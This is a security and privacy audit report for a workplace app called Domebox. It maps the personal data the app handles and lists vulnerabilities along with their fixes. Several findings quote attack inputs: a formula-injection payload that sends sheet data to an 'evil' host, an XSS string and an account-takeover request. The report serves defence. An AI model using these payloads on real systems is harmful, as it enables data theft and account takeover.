# Domebox — pre-launch security and privacy audit

Date: 28 October 2026. Scope: both editions (Domebox and Domebox Lite). That covers the
Apps Script backend (`dist/code.gs`, `reminders.gs`, `backup.gs`, `whatsapp.gs`), the
web app (`dist/index.html`) and the Netlify site.

**Rule followed:** no feature was changed. Every fix closes a hole behind a screen
that already existed. The only things a user will notice:
- Signing out, or changing a password, now also signs out other devices.
- A head of department can no longer edit people outside their own reporting line.
- Reset links last 15 minutes instead of an hour.

`tests/privacy-test.js` re-runs every attack below on each build (47 checks). Results
for this build:
- All 44 backend suites pass (1,626 checks).
- All 20 browser suites pass (496 checks).

---

## 1. Data map — what is collected, where it goes, who sees it

| Collected at | Fields | Stored in | Sent to | Who can read it |
|---|---|---|---|---|
| Sign-up | company, name, email, phone, password | Master > Directory and Global_Users (email, **hash**); tenant > Users | Gmail (welcome email) | Company Admins; installation owner |
| Add person (Team) | name, username, email, phone, role, job, dept, manager, password | tenant > Users (password as **hash**); Master > Global_Users | Gmail (welcome email) | Admin: everyone. HOD: their reporting line. Doer: self. Colleagues see name, role, job, dept and manager only |
| Sign-in | email, password | not stored; failed-attempt counter in CacheService (15 min) | — | — |
| Forgot password | email | Master > Reset_Tokens (**hash** of the link, email, time) | Gmail (link) | installation owner |
| Tasks, projects, meetings, goals, KRAs, cookie points | work content | tenant sheet | Gmail (reminders); Gemini (AI insight, see below) | by role, as above |
| Leave | dates, **reason** (may be medical) | tenant > Leave | — | the person, their manager line, Admins. Others see dates only |
| Appraisals and scores | ratings, comments | tenant > Reviews | — | the person, their manager line, Admins |
| Billing details | legal name, GSTIN, address, billing email | Master > Billing | invoice email | Admin of that company; owner |
| Payment | plan, amount | Master > Invoices, payment log | Razorpay: amount, plan, company sheet id (in `notes`); name and email to prefill checkout | Admin; owner |
| Contact or callback form | name, email, phone, message | not stored | Gmail to the sales inbox | owner |
| AI insight (optional) | team size, task counts, on-time rates, names of people **the asker can already see** | not stored | Google Gemini (key in a header, not the URL) | — |
| Browser | sign-in token; name, username, email, role, job, dept, manager of the signed-in person | `sessionStorage` (cleared when the tab closes); **no cookies, no localStorage** | — | that tab only |
| Errors | where it happened, the error, a reference ID; email addresses **masked** (`a•••@domain`) | Master > ErrorLog | — | owner |
| Backups | full copy of each workspace, nightly | Drive > "Domebox Backups" | — | owner |

Third parties, and what each one receives:
- **Google**: Apps Script, Sheets, Drive and Gmail. Everything above lives here.
- **Razorpay**: amount, plan, workspace sheet id, payer name and email.
- **Gemini**: anonymous counts, plus names the asker can already see. The company name
  is no longer sent.
- **Netlify**: hosts static files only and never receives form data.
- **Google Fonts**: fonts only.
- **WhatsApp Cloud API**: not live yet. When switched on, it receives a phone number,
  a first name and a task title. Its logs show only the last 4 digits of the number.

---

## 2. Vulnerabilities found and fixed

Severity: 🔴 critical, 🟠 high, 🟡 medium.

| # | What | Where | How it was exploited | Fix |
|---|---|---|---|---|
| 1 🔴 | **Account takeover by any head of department.** A HOD could set the password of a peer manager, or of anyone in another team, then sign in as them. | `src/06-team.gs` updateUser_ | M2 sends `updateUser {originalUsername:'m1', password:'x'}` and signs in as M1. | `requireCanManage_()`: a HOD acts only on their own reporting line (followed down through `manager`). A HOD editing their own record cannot set a password, change their manager or switch themselves off. |
| 2 🟠 | **Cross-team manager actions.** Any HOD could set leave, open or submit appraisals, and edit, copy or clear KRAs for people outside their team. | `04-data` setLeave_; `07-reports` getAppraisalForm_ and submitAppraisal_; `09-kra` saveKra_, getKraFor_, copyKraFrom_, clearKra_, applyKraToProfile_ | Call any of these with another team's username. | The same `requireCanManage_()` check is applied in every one of them. |
| 3 🟠 | **Medical leave reasons readable by the whole company.** | `02-router` getLeave | Any Doer calls `getLeave` and reads "Medical — surgery". | Reasons are blank unless you are the person, in their manager line, or an Admin. |
| 4 🟠 | **Everyone's email and phone handed to every Doer.** | getUsers_, the dashboard's staff list, orgNode_ | A Doer opens the team list or the org chart. | `publicPerson_()` sends colleagues only name, username, role, job, dept, manager and active. |
| 5 🟠 | **Other teams' scores and appraisal data readable.** | getAnalytics_, getAccountability_, getPerformanceReport_, aiInsight_ | Ask for another person's analytics or report. | All of them are filtered to the people you can see. |
| 6 🟠 | **Spreadsheet formula injection.** Text starting with `=` was written as a live formula, e.g. `=IMPORTXML("http://evil/?"&A1)`, which can send sheet contents to an outside server when the owner opens the sheet. | every write, through doPost | Make a task titled `=IMPORTXML(...)`. | `neutralizeFormulas_()` prefixes `'` to any incoming text starting with `=`. Sheets stores it as plain text and it reads back exactly as typed. Passwords and tokens are exempt. |
| 7 🟠 | **Sign-out did not end the session.** A copied token stayed valid for 12 hours. Changing or resetting a password left old sessions alive. | auth, router | Steal a token, and keep using it after the victim signs out or changes their password. | Server-side revocation: the per-person `signedOut:<user>` time is checked on every request. Set by Sign out, changing a password (this device gets a fresh token), a manager or Admin resetting it, the reset-link flow, and erasure. |
| 8 🟠 | **Payment could be credited to the wrong company.** A verified payment from company A, submitted by company B, upgraded company B. | `08-commerce` handleVerifiedPayment_ | Replay A's `payment_id` and signature from B's session. | The order's `notes.sheetId` must match the caller's workspace; a mismatch is logged as `WRONG_COMPANY` and nothing is granted. |
| 9 🟡 | **Reset links lasted an hour, were stored in plain text, and older links stayed usable.** | `03-accounts` | Anyone who can read the Master sheet could use a pending link. | Links last **15 minutes**. Only a SHA-256 hash is stored. Using one link kills every other open link for that email. Still single use and still tied to one email. |
| 10 🟡 | **Internal errors shown to users** (sheet names, stack text). | doPost catch | Trigger a fault and read the message. | The user sees "Something went wrong… (Reference 1A2B3C4D)". The detail and stack go to ErrorLog under that reference. |
| 11 🟡 | **Email addresses in logs.** | sendEmail_, reminders.gs, whatsapp.gs | Read ErrorLog or the execution log. | Masked to `a•••@domain` and phone to `•••1234`. No password or token is logged anywhere (tested). |
| 12 🟡 | **Brute-force limits too loose.** | `domebox/auth.gs` | 8 sign-in guesses per 15 min; 5 reset emails per hour. | Sign-in: **5 per 15 min**. Reset: **3 per hour**. Sign-ups: 30 per hour installation-wide (each one copies a spreadsheet). |
| 13 🟡 | **A missing secret did not close the service.** Errors named the missing Script Property to visitors. | doPost | Visit a half-configured deployment. | `requireConfig_()` refuses every request unless MASTER_DB_ID, TEMPLATE_ID, AUTH_PEPPER and TOKEN_SECRET are set. Visitors see "not configured yet"; the names go only to the execution log. |
| 14 🟡 | **Gemini key in the URL** (URLs end up in proxy logs). | aiInsight_ | — | Sent in the `x-goog-api-key` header. |
| 15 🟡 | **Script injection through the Help search box** (self-XSS). `&#39;` is decoded back to `'` inside `onclick`. | `src/ui/16-help.js` | Search for `');alert(1);//` and click "Ask us instead". | `jsArg()` encodes the value as a JS string first, then as HTML. |
| 16 🟡 | **More personal data than needed in sessionStorage** (the whole user record, phone included). | `src/ui/04-core.js` | XSS or a shared computer. | Only name, username, email, role, job, dept and manager are kept. |
| 17 🟡 | **No way to erase a person or a company.** | — | Data-protection requests could not be met. | New `src/20-privacy.gs`, owner-run from the editor: `eraseCompanyData(owner, 'ERASE owner')` and `erasePerson(owner, person, 'ERASE person')`. |

**Earlier passes, re-verified here:**
- **Secrets:** none in the code (see SECURITY-CRITICAL.md).
- **Tenant isolation:** the workspace id comes only from the signed token.
- **Doer writes:** every write a Doer should not make is refused (every write the attack script tried).
- **Payment signature and replay:** covered by `pay-test`.

---

## 3. Every check, passed or failed

✅ passed as found · 🔧 failed, now fixed · ⚠️ platform limit, see section 4.

**Privacy**

| Check | Result |
|---|---|
| Collection points mapped | ✅ section 1 |
| Logs free of emails, passwords, phones, tokens | 🔧 #11 |
| Third parties get only needed fields | 🔧 company name removed from Gemini; Gemini key moved out of the URL (#14) |
| Passwords hashed, never stored, logged or returned in plain text | ✅ salted, peppered, iterated HMAC-SHA256 · ⚠️ not bcrypt or argon2 |
| Cookies httpOnly, secure, sameSite | ✅ none are used · ⚠️ the token is in sessionStorage |
| No personal data in localStorage | ✅ localStorage is not used · 🔧 sessionStorage trimmed (#16) |
| No hashes in API responses | ✅ tested |
| No other users' data in API responses | 🔧 #3, #4, #5 |
| Internal IDs | ⚠️ the workspace sheet id is inside the signed token |
| Deletion flow | 🔧 #17 |

**Pre-deploy**

| Check | Result |
|---|---|
| Refuses to start without critical settings | 🔧 #13 |
| No console.log or debugger in shipped code | ✅ |
| No security TODO or FIXME | ✅ |
| No hard-coded test credentials | ✅ demo passwords are random and kept in Script Properties |
| No test endpoints in production | ✅ `/__setplan` and similar exist only in `tests/server.js` |
| Debug off | ✅ |
| Errors: generic message plus a correlation ID | 🔧 #10 |
| Header: `X-Content-Type-Options: nosniff` | ✅ |
| Header: `X-Frame-Options: DENY` and `frame-ancestors 'none'` | ✅ |
| Header: HSTS for 1 year | ✅ `max-age=31536000; includeSubDomains` |
| Header: CSP | ✅ · ⚠️ `'unsafe-inline'` and `'unsafe-eval'` |
| Rate limit: sign-in 5 per 15 min | 🔧 #12 · ⚠️ counted per account, not per IP |
| Rate limit: reset 3 per hour | 🔧 #12 |
| CORS not `*` | ⚠️ Google sets `*` on Apps Script; nothing relies on cookies |
| Database TLS and no default credentials | ✅ Sheets is reached only over Google's TLS APIs; the sheets are private, there are no database passwords, and Drive sharing is off |

**Deep audit**

| Check | Result |
|---|---|
| Authentication (signed token, 12 h, checked server-side every call; role and active status re-read from the sheet on every call) | ✅ |
| Authorization: Doer | ✅ |
| Authorization: HOD | 🔧 #1, #2 |
| IDOR across companies | ✅ impossible: the workspace comes from the signed token |
| IDOR inside a company | 🔧 #1 to #5 |
| Reset tokens: random | ✅ 2 × UUIDv4 |
| Reset tokens: single use | ✅ |
| Reset tokens: 15 min or less | 🔧 #9 |
| Reset tokens: tied to one user | ✅ |
| Reset tokens: stored hashed | 🔧 #9 |
| JWT-style token: strong secret | ✅ 2 × UUID, kept in Script Properties |
| JWT-style token: expiry | ✅ |
| JWT-style token: revoked on sign-out | 🔧 #7 |
| Payment: price set on the server | ✅ |
| Payment: signature verified | ✅ HMAC on `order|payment` |
| Payment: status fetched from Razorpay | ✅ |
| Payment: replay blocked | ✅ |
| Payment: credited to the right company | 🔧 #8 |
| Webhook | ✅ the body is trusted only for which payment to look up · ⚠️ the header signature cannot be read |
| SQL injection | ✅ no SQL anywhere |
| Formula injection (the Sheets equivalent) | 🔧 #6 |
| XSS | ✅ every value is escaped through `esc()` · 🔧 #15 |
| File uploads | ✅ none exist |

**Attacker paths**

| Path | Result |
|---|---|
| Change an ID in a request | 🔧 #1 to #5 · ✅ across companies |
| Sign-in bypass | ✅ forged, edited and expired tokens all refused (auth-test) |
| Privilege escalation (role change, adding an Admin) | ✅ only an Admin can |
| Feature abuse: sign-up flood | 🔧 #12 |
| Feature abuse: reminder or email spam | ✅ throttled |
| Feature abuse: uploads | ✅ none exist |
| Feature abuse: promo codes | ⚠️ section 4 |
| Content injection: HTML | ✅ escaped |
| Content injection: formulas | 🔧 #6 |
| Content injection: Help box | 🔧 #15 |
| Exposed `.env` or `.git` | ✅ the Netlify package copies only listed files (netlify-package-test) |
| Exposed docs or health page | ✅ `ping` returns only the server time |
| Business logic: negative or changed amount | ✅ the amount is never taken from the client |
| Business logic: discount stacking | ✅ one promo per order, capped at 100 % and never below ₹1 |
| Business logic: self-referral | ✅ there is no referral scheme |
| Business logic: trial restart | ⚠️ section 4 |

---

## 4. Drawbacks — what cannot be fixed on this platform, and what limits the risk

| Drawback | Why | Mitigation |
|---|---|---|
| Passwords use iterated HMAC-SHA256, not bcrypt or argon2 | Apps Script has no bcrypt, argon2 or scrypt, and no native modules | Salted per user, peppered with a secret kept outside the sheet (AUTH_PEPPER), 1000 rounds. A stolen sheet without Script Properties cannot be cracked offline. Use `benchmarkHash()` to raise the rounds. |
| Rate limits are per account, not per IP | Apps Script never sees the client's IP | Per-account lockout, an installation-wide cap on sign-ups, and generic messages that do not reveal whether an email exists. |
| CORS is `*` and the API sends no security headers | Google sets CORS on Apps Script responses; ContentService cannot set headers | No cookies are used, so a third-party site cannot ride a session (no CSRF). Every call needs the token in the body. The web pages themselves (Netlify) do carry the full header set. |
| The token lives in sessionStorage, not an httpOnly cookie | The site and the API are on different domains, and Apps Script cannot set cookies | Cleared when the tab closes, revocable on the server (#7), lasts 12 h, and protected by escaping and the CSP. |
| CSP allows `'unsafe-inline'` | The app's handlers are inline | Every value is escaped; frames, objects and the base URI are locked. |
| CSP allows `'unsafe-eval'` | Kept on purpose: Razorpay Checkout is third-party code and payments broke recently. Removing it untested could break the last step of every payment. | Test a payment with it removed on a staging copy, then drop it from `netlify/_headers` and `netlify.toml`. |
| Razorpay webhook header signature is not checked | Apps Script cannot read request headers | The webhook only says which payment to look at; amount, status and company are fetched from Razorpay with our own key. |
| The workspace sheet id is readable inside the token | The token is signed, not encrypted | The id is useless without Drive permission (the sheets are private), and the signature stops it from being changed. |
| Promo codes can be reused without limit | Codes are a Script Property, not a ledger | Keep codes short-lived; remove a code from PROMO_CODES to end it. |
| A trial can be restarted with a new email | Nothing ties a company to a person | Each trial is a separate empty workspace; no data carries over. |
| An erased person's username stays on old tasks | The company's own history must still add up | Name, email, phone, password and leave reasons are removed. |
| Invoices are kept after erasure | Indian GST law: keep for 8 years | Only invoice fields (legal name, GSTIN, address, amounts). |
| Backups taken before an erasure still hold the old data | Backups are copies | They age out under the backup schedule. `eraseCompanyData` also bins every backup of that company. |
| The repository is public | Owner's choice | No secrets are in it; `secrets-test` fails the build if one appears. |

---

## 5. After deploying this version

1. In **both** Apps Script projects (Domebox and Domebox Lite): replace `Code.gs` and
   `reminders.gs` (and `whatsapp.gs` if you use it), then **Deploy → Manage deployments
   → ✏ → New version → Deploy**.
2. Upload both website folders to Netlify again (`netlify-upload` and `lite-upload`).
3. Make one real test payment on domebox.in.
4. Tell your HODs: they now manage only their own reporting line. An Admin still
   manages everyone.
5. To honour an erasure request, run `erasePerson` or `eraseCompanyData` from the
   editor. The exact call is in the comment at the top of `src/20-privacy.gs`.
